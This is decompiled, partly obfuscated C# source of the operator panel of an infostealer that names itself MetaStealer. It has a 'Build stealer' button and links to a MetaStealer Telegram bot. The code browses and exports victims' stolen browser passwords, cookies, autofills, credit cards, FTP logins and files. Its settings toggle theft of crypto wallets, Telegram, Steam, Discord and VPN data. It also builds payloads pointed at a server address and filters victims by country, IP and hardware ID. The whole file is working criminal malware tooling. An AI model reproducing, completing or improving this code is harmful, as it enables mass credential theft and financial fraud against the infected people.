        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                IList<Browser> browsers = user.Credentials.Browsers;
                if (browsers != null && browsers.Any())
                {
                    new ChooseBrowserFrm(user, ViewerType.Passwords).ShowDialog(this);
                }
                else
                {
                    MessageBox.Show(this, "Browsers not found");
                }
                user = default(UserLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void cookiesToolStripMenuItem_Click(object sender, object e)
    {
        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                IList<Browser> browsers = user.Credentials.Browsers;
                if (browsers != null && browsers.Any())
                {
                    new ChooseBrowserFrm(user, ViewerType.Cookies).ShowDialog(this);
                }
                else
                {
                    MessageBox.Show(this, "Browsers not found");
                }
                user = default(UserLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private void topHeader_Paint(object sender, object e)
    {
        int num = base.Width - 1;
        int num2 = base.Height - 1;
        Pen pen = new Pen(ColorPicker.ThemeColor, 3f);
        ((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
    }

    private void method_2(object sender, object e)
    {
    }

    private async void saveBtn_Click(object sender, object e)
    {
        string newSearch = ((AnimaTextBox)searchTb).Text;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                FolderSelectDialog folderSelectDialog = new FolderSelectDialog
                {
                    InitialDirectory = Directory.GetCurrentDirectory(),
                    Title = "Choose directory to save logs"
                };
                if (folderSelectDialog.Show(base.Handle))
                {
                    LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
                    LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
                    new SaveProcessFrm(folderSelectDialog.FileName, newSearch).ShowDialog(this);
                    LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
                    LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
                    LazyLoader<UserLogsDb>.Instance.PageController.UpdatePages(0, LazyLoader<UserLogsDb>.Instance.DbInstance);
                    LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = true;
                    LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].ResetBindings();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void saveToolStripMenuItem_Click(object sender, object e)
    {
        try
        {
            object obj = new _003C_003Ec__DisplayClass50_0();
            ((_003C_003Ec__DisplayClass50_0)obj)._003C_003E4__this = this;
            ((_003C_003Ec__DisplayClass50_0)obj).folderBrowser = new FolderSelectDialog
            {
                InitialDirectory = Directory.GetCurrentDirectory(),
                Title = "Choose directory to save logs"
            };
            if (!((_003C_003Ec__DisplayClass50_0)obj).folderBrowser.Show(base.Handle) || ((DataGridView)logsListView).SelectedRows.Count <= 0)
            {
                return;
            }
            object enumerator = ((DataGridView)logsListView).SelectedRows.GetEnumerator();
            try
            {
                while (((IEnumerator)enumerator).MoveNext())
                {
                    DataGridViewRow dataGridViewRow = (DataGridViewRow)((IEnumerator)enumerator).Current;
                    _003C_003Ec__DisplayClass50_0 _003C_003Ec__DisplayClass50_ = (_003C_003Ec__DisplayClass50_0)obj;
                    int selectedItem = (int)dataGridViewRow.Cells[0].Value;
                    await Task.Factory.StartNew(delegate
                    {
                        try
                        {
                            UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                            userLog.Checked = true;
                            LazyLoader<UserLogsDb>.Instance.Save(userLog);
                            List<string> domainDetects = ((RemoteClientSettings.DDPatterns == null) ? new List<string>() : RemoteClientSettings.DDPatterns.Cast<string>().ToList());
                            userLog.SaveTo(new HeaderParams(ProfileSettings.HeaderActivated, SettingsOfPanel.Default.LogHeader), _003C_003Ec__DisplayClass50_.folderBrowser.FileName, domainDetects);
                            userLog.Credentials = new Credentials();
                            userLog.Screenshot = new byte[0];
                            int index = LazyLoader<UserLogsDb>.Instance.FindIndex((UserLog x) => x.ID == userLog.ID);
                            LazyLoader<UserLogsDb>.Instance.DbInstance[index] = userLog;
                            LazyLoader<UserLogsDb>.Instance.PageController.UpdateByIndex(index, userLog);
                            userLog = default(UserLog);
                        }
                        catch (Exception ex2)
                        {
                            MessageBox.Show(_003C_003Ec__DisplayClass50_._003C_003E4__this, ex2.Message);
                        }
                    });
                }
            }
            finally
            {
                if (enumerator is IDisposable disposable)
                {
                    disposable.Dispose();
                }
            }
            MessageBox.Show(this, "Successfully saved");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private async void setCommentBtn_Click(object sender, object e)
    {
        try
        {
            if (((DataGridView)logsListView).SelectedRows.Count > 0)
            {
                object obj = new _003C_003Ec__DisplayClass51_0();
                ((_003C_003Ec__DisplayClass51_0)obj)._003C_003E4__this = this;
                ((_003C_003Ec__DisplayClass51_0)obj).comment = ((AnimaTextBox)commentTb).Text;
                List<int> list = new List<int>();
                List<int> list2 = new List<int>();
                foreach (DataGridViewRow selectedRow in ((DataGridView)logsListView).SelectedRows)
                {
                    list2.Add(selectedRow.Index);
                    list.Add((int)selectedRow.Cells[0].Value);
                }
                foreach (int item in list2)
                {
                    try
                    {
                        if (!string.IsNullOrWhiteSpace((string)object_6))
                        {
                            UserLog value = ((Collection<UserLog>)object_5)[item];
                            value.Comment = ((_003C_003Ec__DisplayClass51_0)obj).comment;
                            ((Collection<UserLog>)object_5)[item] = value;
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
                using List<int>.Enumerator enumerator3 = list.GetEnumerator();
                while (enumerator3.MoveNext())
                {
                    _003C_003Ec__DisplayClass51_1 _003C_003Ec__DisplayClass51_ = new _003C_003Ec__DisplayClass51_1();
                    _003C_003Ec__DisplayClass51_.CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass51_0)obj;
                    _003C_003Ec__DisplayClass51_.selectedItem = enumerator3.Current;
                    object CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass51_2();
                    ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2 = _003C_003Ec__DisplayClass51_;
                    ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).userLog = default(UserLog);
                    await Task.Factory.StartNew(delegate
                    {
                        try
                        {
                            ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.selectedItem);
                            ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).userLog.Comment = ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.comment;
                            LazyLoader<UserLogsDb>.Instance.Save(((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).userLog);
                        }
                        catch (Exception ex3)
                        {
                            MessageBox.Show(((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this, "Error item: " + ex3.ToString());
                        }
                    });
                    int index = LazyLoader<UserLogsDb>.Instance.FindIndex((UserLog x) => x.ID == ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.selectedItem);
                    LazyLoader<UserLogsDb>.Instance.PageController.UpdateByIndex(index, ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).userLog);
                    LazyLoader<UserLogsDb>.Instance.DbInstance[index] = ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).userLog;
                    ((_003C_003Ec__DisplayClass51_2)CS_0024_003C_003E8__locals0).userLog = default(UserLog);
                }
            }
            else
            {
                MessageBox.Show(this, "Select logs to set comment");
            }
        }
        catch (Exception ex2)
        {
            MessageBox.Show(this, "Error: " + ex2.ToString());
        }
    }

    private void method_3(object sender, object e)
    {
    }

    private async void systemInfoToolStripMenuItem_Click(object sender, object e)
    {
        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                new SystemInfoFrm(LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem)).ShowDialog(this);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void autofillsToolStripMenuItem_Click(object sender, object e)
    {
        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                IList<Browser> browsers = user.Credentials.Browsers;
                if (browsers != null && browsers.Any())
                {
                    new ChooseBrowserFrm(user, ViewerType.Autofills).ShowDialog(this);
                }
                else
                {
                    MessageBox.Show(this, "Browsers not found");
                }
                user = default(UserLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void creditCardsToolStripMenuItem_Click(object sender, object e)
    {
        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                IList<Browser> browsers = user.Credentials.Browsers;
                if (browsers != null && browsers.Any())
                {
                    new ChooseBrowserFrm(user, ViewerType.CreditCards).ShowDialog(this);
                }
                else
                {
                    MessageBox.Show(this, "Browsers not found");
                }
                user = default(UserLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void saveSettingsBtn_Click(object sender, object e)
    {
        bool grabBrowsers = ((MetroSetCheckBox)grabBrowsersCb).Checked;
        bool grabFtps = ((MetroSetCheckBox)grabFtpsCb).Checked;
        bool grabFiles = ((MetroSetCheckBox)grabFilesCb).Checked;
        bool grabImClients = ((MetroSetCheckBox)grabImClientsCb).Checked;
        bool antiDuplicate = ((MetroSetCheckBox)duplicateCb).Checked;
        bool grabWallets = ((MetroSetCheckBox)grabColdWalletCb).Checked;
        bool blockEmptyLogs = ((MetroSetCheckBox)blockEmptyLogsCb).Checked;
        bool jsonCookies = ((MetroSetCheckBox)this.m_a6).Checked;
        bool grabScreenshot = ((MetroSetCheckBox)cf).Checked;
        bool grabVPN = ((MetroSetCheckBox)cc).Checked;
        bool grabTelegram = ((MetroSetCheckBox)d1).Checked;
        bool grabSteam = ((MetroSetCheckBox)ca).Checked;
        bool grabDiscord = ((MetroSetCheckBox)discordCb).Checked;
        bool autoRefresh = ((MetroSetCheckBox)autoRefreshCb).Checked;
        bool autoUpdate = ((MetroSetCheckBox)autoUpdatePanelCb).Checked;
        string autosaveDir = ((AnimaTextBox)e6).Text;
        IEnumerable<string> blacklistedBuilds = ((ListBox)blackListBuildsLb).Items.Cast<string>();
        IEnumerable<string> blackListedHWIDs = ((ListBox)fe).Items.Cast<string>();
        IEnumerable<string> blackListedCountries = ((ListBox)blackListLb).Items.Cast<string>();
        IEnumerable<string> blackListedIPS = ((ListBox)blackListIPsLb).Items.Cast<string>();
        IEnumerable<string> getFilesSettings = ((ListBox)getFilesSettingsLb).Items.Cast<string>();
        IEnumerable<string> domainsSettings = ((ListBox)cd).Items.Cast<string>();
        IEnumerable<string> browsersExtensions = ((ListBox)browsersExtensionsListBox).Items.Cast<string>();
        await Task.Factory.StartNew(delegate
        {
            try
            {
                lock (settingsLock)
                {
                    RemoteClientSettings.BlackListedBuilds.Clear();
                    RemoteClientSettings.BlacklistedHWID.Clear();
                    RemoteClientSettings.BlacklistedCountry.Clear();
                    RemoteClientSettings.BlackListedIPS.Clear();
                    RemoteClientSettings.DDPatterns.Clear();
                    RemoteClientSettings.GrabPaths.Clear();
                    RemoteClientSettings.BrowserExtensions.Clear();
                    RemoteClientSettings.GrabDiscord = grabDiscord;
                    RemoteClientSettings.GrabBrowsers = grabBrowsers;
                    RemoteClientSettings.GrabFiles = grabFiles;
                    RemoteClientSettings.GrabFTP = grabFtps;
                    RemoteClientSettings.GrabImClients = grabImClients;
                    RemoteClientSettings.AntiDuplicate = antiDuplicate;
                    RemoteClientSettings.GrabWallets = grabWallets;
                    RemoteClientSettings.BlockEmptyLogs = blockEmptyLogs;
                    RemoteClientSettings.SaveAsJSON = jsonCookies;
                    RemoteClientSettings.AutosaveDirectory = autosaveDir;
                    RemoteClientSettings.AutoUpdate = autoUpdate;
                    RemoteClientSettings.GrabSteam = grabSteam;
                    RemoteClientSettings.GrabTelegram = grabTelegram;
                    RemoteClientSettings.GrabVPN = grabVPN;
                    RemoteClientSettings.GrabScreenshot = grabScreenshot;
                    RemoteClientSettings.AutoRefreshCookies = autoRefresh;
                    if (browsersExtensions.Any())
                    {
                        foreach (string item in browsersExtensions)
                        {
                            RemoteClientSettings.BrowserExtensions.Add(item);
                        }
                    }
                    if (blackListedHWIDs.Any())
                    {
                        foreach (string item2 in blackListedHWIDs)
                        {
                            RemoteClientSettings.BlacklistedHWID.Add(item2);
                        }
                    }
                    if (blacklistedBuilds.Any())
                    {
                        foreach (string item3 in blacklistedBuilds)
                        {
                            RemoteClientSettings.BlackListedBuilds.Add(item3);
                        }
                    }
                    if (blackListedIPS.Any())
                    {
                        foreach (string item4 in blackListedIPS)
                        {
                            RemoteClientSettings.BlackListedIPS.Add(item4);
                        }
                    }
                    if (blackListedCountries.Any())
                    {
                        foreach (string item5 in blackListedCountries)
                        {
                            RemoteClientSettings.BlacklistedCountry.Add(item5);
                        }
                    }
                    if (getFilesSettings.Any())
                    {
                        foreach (string item6 in getFilesSettings)
                        {
                            RemoteClientSettings.GrabPaths.Add(item6);
                        }
                    }
                    if (domainsSettings.Any())
                    {
                        foreach (string item7 in domainsSettings)
                        {
                            RemoteClientSettings.DDPatterns.Add(item7);
                        }
                    }
                    RemoteClientSettings.SaveSettings();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
        MessageBox.Show(this, "Successfully");
    }

    private void addBlackCountryBtn_Click(object sender, object e)
    {
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)blackCountryTb).Text))
        {
            MessageBox.Show(this, "Please enter a country");
            return;
        }
        ((ListBox)blackListLb).Items.Add(((AnimaTextBox)blackCountryTb).Text);
        ((AnimaTextBox)blackCountryTb).Text = string.Empty;
    }

    private void addSearchPatternBtn_Click(object sender, object e)
    {
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)searchPatternTb).Text))
        {
            MessageBox.Show(this, "Please enter a search pattern");
            return;
        }
        ((ListBox)getFilesSettingsLb).Items.Add(((AnimaTextBox)searchPatternTb).Text);
        ((AnimaTextBox)searchPatternTb).Text = string.Empty;
    }

    private void deleteToolStripMenuItem_Click(object sender, object e)
    {
        ((ListBox)blackListLb).Items.RemoveAt(((ListControl)blackListLb).SelectedIndex);
    }

    private void blackListCms_2_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((ListBox)blackListLb).SelectedItems.Count == 0;
    }

    private void blackListCms_3_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((ListBox)getFilesSettingsLb).SelectedItems.Count == 0;
    }

    private void toolStripMenuItem1_Click(object sender, object e)
    {
        ((ListBox)getFilesSettingsLb).Items.RemoveAt(((ListControl)getFilesSettingsLb).SelectedIndex);
    }

    private async void fTPToolStripMenuItem_Click(object sender, object e)
    {
        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                IList<LoginPair> ftpConnections = userLog.Credentials.FtpConnections;
                if (ftpConnections != null && ftpConnections.Count > 0)
                {
                    new PassViewer(new BindingList<LoginPair>(userLog.Credentials.FtpConnections.ToList())).ShowDialog(this);
                }
                else
                {
                    MessageBox.Show(this, "FTPs not found");
                }
                userLog = default(UserLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void filesToolStripMenuItem_Click(object sender, object e)
    {
        int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                IList<RemoteFile> files = userLog.Credentials.Files;
                if (files != null && files.Count > 0)
                {
                    new FilesViewer(new BindingList<RemoteFile>(userLog.Credentials.Files.ToList())).ShowDialog(this);
                }
                else
                {
                    MessageBox.Show(this, "Files not found");
                }
                userLog = default(UserLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private void method_4(object sender, object e)
    {
        Process.Start("https://t.me/metastealer_bot");
    }

    private async void singleSort_Click(object sender, object e)
    {
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
        ((MetroSetButton)singleSort).Enabled = false;
        ((MetroSetButton)e9).Enabled = false;
        ((MetroSetButton)e8).Enabled = false;
        ((MetroSetButton)ee).Enabled = false;
        SingleSearchParams singleSearch = new SingleSearchParams
        {
            SetComment = ((AnimaTextBox)this.m_a9).Text,
            SkipComment = ((AnimaTextBox)this.m_a7).Text,
            BuildID = ((AnimaTextBox)singleIdSortTb).Text,
            Comment = ((AnimaTextBox)singleCommentSortTb).Text,
            OS = ((AnimaTextBox)singleOsSortTb).Text,
            Country = ((AnimaTextBox)singleCountrySortTb).Text,
            ContainsAFs = ((MetroSetCheckBox)singleAfSortCb).Checked,
            ContainsCCs = ((MetroSetCheckBox)singleCCsSortCb).Checked,
            ContainsFiles = ((MetroSetCheckBox)singleFilesSortCb).Checked,
            ContainsFTPs = ((MetroSetCheckBox)singleFtpsSortCb).Checked,
            CookieDomain = ((AnimaTextBox)singleCookieSortTb).Text,
            PasswordDomain = ((AnimaTextBox)singlePasswordSortTb).Text,
            ContainsWallets = ((MetroSetCheckBox)singleColdWalletSortCb).Checked,
            SkipCookies = ((MetroSetCheckBox)ba).Checked,
            SkipPasswords = ((MetroSetCheckBox)b8).Checked,
            RefreshDD = ((MetroSetCheckBox)ea).Checked,
            SkipChecked = ((MetroSetCheckBox)be).Checked,
            FilesToSearch = ((AnimaTextBox)ef).Text,
            ContainsSteam = ((MetroSetCheckBox)f1).Checked,
            ContainsTelegram = ((MetroSetCheckBox)f3).Checked,
            PasswordsMoreThan = (int)((NumericUpDown)passMoreThan).Value,
            CookiesMoreThan = (int)((NumericUpDown)cookiesMoreThan).Value
        };
        singleSearch.LogFrom = ((DateTimePicker)d5).Value;
        singleSearch.LogTo = ((DateTimePicker)d6).Value;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                FolderSelectDialog folderSelectDialog = new FolderSelectDialog
                {
                    InitialDirectory = Directory.GetCurrentDirectory(),
                    Title = "Choose directory to save logs"
                };
                if (folderSelectDialog.Show(base.Handle))
                {
                    System.IO.File.WriteAllText("sorterState.json", singleSearch.ToJSON());
                    LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
                    logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate (int index, int total)
                    {
                        if (!base.InvokeRequired)
                        {
                            ((Control)singleStatusLbl).Text = $"{index} / {total}";
                        }
                        else
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                ((Control)singleStatusLbl).Text = $"{index} / {total}";
                            });
                        }
                    });
                    int num = logSorter.Sort();
                    Invoke((MethodInvoker)delegate
                    {
                        ((Control)singleStatusLbl).Text = "Waiting";
                    });
                    if (num > 0)
                    {
                        MessageBox.Show(this, $"Success. Removed {num} empty logs.");
                    }
                    else
                    {
                        MessageBox.Show(this, "Success.");
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
        ((MetroSetButton)singleSort).Enabled = true;
        ((MetroSetButton)e9).Enabled = true;
        ((MetroSetButton)e8).Enabled = true;
        ((MetroSetButton)ee).Enabled = true;
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
    }

    private async void sortDomain_Click(object sender, object e)
    {
        ((MetroSetButton)sortDomain).Enabled = false;
        if (!string.IsNullOrWhiteSpace(((AnimaTextBox)domainsTb).Text))
        {
            string[] domains = ((AnimaTextBox)domainsTb).Text.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            await Task.Factory.StartNew(delegate
            {
                try
                {
                    FolderSelectDialog folderSelectDialog = new FolderSelectDialog
                    {
                        InitialDirectory = Directory.GetCurrentDirectory(),
                        Title = "Choose directory to save logs"
                    };
                    if (folderSelectDialog.Show(base.Handle))
                    {
                        string[] array = domains;
                        foreach (string domain in array)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                ((Control)currentDomainLbl).Text = domain;
                            });
                            LogSorter logSorter = new LogSorter(Path.Combine(folderSelectDialog.FileName, domain), new SingleSearchParams
                            {
                                LogFrom = DateTime.MinValue,
                                LogTo = DateTime.MaxValue,
                                PasswordDomain = domain
                            }, writeCounters: true);
                            logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate (uint index, uint total)
                            {
                                MainFrm mainFrm = this;
                                int index = (int)index;
                                int total = (int)total;
                                Invoke((MethodInvoker)delegate
                                {
                                    ((Control)mainFrm.domainSorterLbl).Text = $"{index} / {total}";
                                });
                            });
                            logSorter.Sort();
                        }
                        Invoke((MethodInvoker)delegate
                        {
                            ((Control)domainSorterLbl).Text = "Waiting";
                            ((Control)currentDomainLbl).Text = "None";
                        });
                        MessageBox.Show(this, "Success");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(this, "Error: " + ex.ToString());
                }
            });
        }
        else
        {
            MessageBox.Show(this, "Please, enter a domains");
        }
        ((MetroSetButton)sortDomain).Enabled = true;
    }

    private async void openIconBtn_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "Ico files (*.ico)|*.ico";
                    ofd.CheckPathExists = true;
                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            ((AnimaTextBox)iconPath).Text = ofd.FileName;
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    private async void createBuildBtn_Click(object sender, object e)
    {
        ((MetroSetButton)createBuildBtn).Enabled = false;
        ((Control)createBuildBtn).Text = "Building";
        string serverIp = ((AnimaTextBox)serverIpTb).Text;
        string buildId = ((AnimaTextBox)buildIdTb).Text;
        string icoPath = ((AnimaTextBox)iconPath).Text;
        string message = ((AnimaTextBox)errorMessageTb).Text;
        string value = ((Control)buildType).Text;
        string[] ips = serverIp.Split('|');
        string[] array = ips;
        foreach (string text in array)
        {
            if (!IPAddress.TryParse(text, out var _) && !new Regex("^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\\.)+[A-Za-z]{2,6}$").IsMatch(text))
            {
                MessageBox.Show(this, "'" + text + "' is invalid address");
                ((Control)createBuildBtn).Text = "Build stealer";
                ((MetroSetButton)createBuildBtn).Enabled = true;
                return;
            }
        }
        if (!Enum.TryParse<BuildType>(value, out var _))
        {
            MessageBox.Show(this, "Please select build type");
        }
        await Task.Factory.StartNew(delegate
        {
        });
        ((Control)createBuildBtn).Text = "Build stealer";
        ((MetroSetButton)createBuildBtn).Enabled = true;
    }

    private void minimizeBtn_Click(object sender, object e)
    {
        Hide();
        ((NotifyIcon)c3).Visible = true;
        ((NotifyIcon)c3).ShowBalloonTip(3);
    }

    private void method_5(object sender, object e)
    {
        ((ListBox)getFilesSettingsLb).Items.RemoveAt(((ListControl)getFilesSettingsLb).SelectedIndex);
    }

    private async void deleteToolStripMenuItem1_Click(object sender, object e)
    {
        try
        {
            nint num = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage;
            LazyLoader<UserLogsDb>.Instance.PageController.Pages[(int)num].RaiseListChangedEvents = false;
            LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
            if (((DataGridView)logsListView).SelectedRows.Count <= 0)
            {
                return;
            }
            List<int> list = new List<int>();
            List<int> list2 = new List<int>();
            foreach (DataGridViewRow selectedRow in ((DataGridView)logsListView).SelectedRows)
            {
                list2.Add(selectedRow.Index);
                list.Add((int)selectedRow.Cells[0].Value);
            }
            for (int i = 0; i < list2.Count; i++)
            {
                try
                {
                    int num2 = list2[i];
                    if (!string.IsNullOrWhiteSpace((string)object_6))
                    {
                        ((Collection<UserLog>)object_5).RemoveAt(num2);
                        ((BindingList<UserLog>)object_5).ResetItem(num2);
                    }
                }
                catch (Exception)
                {
                }
            }
            foreach (int index in list)
            {
                await Task.Factory.StartNew(delegate
                {
                    try
                    {
                        LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == index);
                    }
                    catch (Exception)
                    {
                    }
                });
            }
            LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
            LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
            LazyLoader<UserLogsDb>.Instance.PageController.Clear();
            LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
            if (LazyLoader<UserLogsDb>.Instance.PageController.PagesCount < num)
            {
                LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount - 1;
            }
            else
            {
                LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = (int)num;
            }
        }
        catch (Exception ex2)
        {
            MessageBox.Show(this, "Error: " + ex2.Message);
        }
    }

    private async void searchBtn_Click(object sender, object e)
    {
        try
        {
            object_6 = ((AnimaTextBox)searchTb).Text;
            ((Collection<UserLog>)object_5).Clear();
            if (string.IsNullOrWhiteSpace((string)object_6))
            {
                ((Control)d7).Visible = true;
                ((Control)d8).Visible = true;
                ((Control)da).Visible = true;
                ((Control)d9).Visible = true;
                ((Control)dd).Visible = true;
                ((Control)db).Visible = true;
                ((Control)de).Visible = true;
                ((Control)dc).Visible = true;
                if (base.InvokeRequired)
                {
                    Invoke((MethodInvoker)delegate
                    {
                        LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage;
                    });
                }
                else
                {
                    LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage;
                }
                return;
            }
            ((Control)d7).Visible = false;
            ((Control)d8).Visible = false;
            ((Control)da).Visible = false;
            ((Control)d9).Visible = false;
            ((Control)dd).Visible = false;
            ((Control)db).Visible = false;
            ((Control)de).Visible = false;
            ((Control)dc).Visible = false;
            await Task.Factory.StartNew(delegate
            {
                UserLog[] array = new UserLog[0];
                lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
                {
                    array = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
                }
                UserLog[] array2 = array;
                for (int i = 0; i < array2.Length; i++)
                {
                    UserLog item = array2[i];
                    if (item.IsMatch((string)object_6))
                    {
                        ((Collection<UserLog>)object_5).Add(item);
                    }
                }
            });
            if (((IEnumerable<UserLog>)object_5).Any())
            {
                if (base.InvokeRequired)
                {
                    Invoke((MethodInvoker)delegate
                    {
                        ((DataGridView)logsListView).DataSource = object_5;
                    });
                }
                else
                {
                    ((DataGridView)logsListView).DataSource = object_5;
                }
                return;
            }
            MessageBox.Show(this, "Not found");
            object obj = d7;
            object obj2 = d8;
            object obj3 = da;
            object obj4 = d9;
            object obj5 = dd;
            object obj6 = db;
            object obj7 = de;
            ((Control)dc).Visible = true;
            ((Control)obj7).Visible = true;
            ((Control)obj6).Visible = true;
            ((Control)obj5).Visible = true;
            ((Control)obj4).Visible = true;
            ((Control)obj3).Visible = true;
            ((Control)obj2).Visible = true;
            ((Control)obj).Visible = true;
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    private async void resetStatsBtn_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                lock (this.m_a)
                {
                    ((StatisticDb)object_8).SetDefault();
                    ((StatisticDb)object_8).SaveSettings();
                }
                UpdateStat();
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void pathsImportBtn_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "Txt files (*.txt)|*.txt";
                    ofd.CheckPathExists = true;
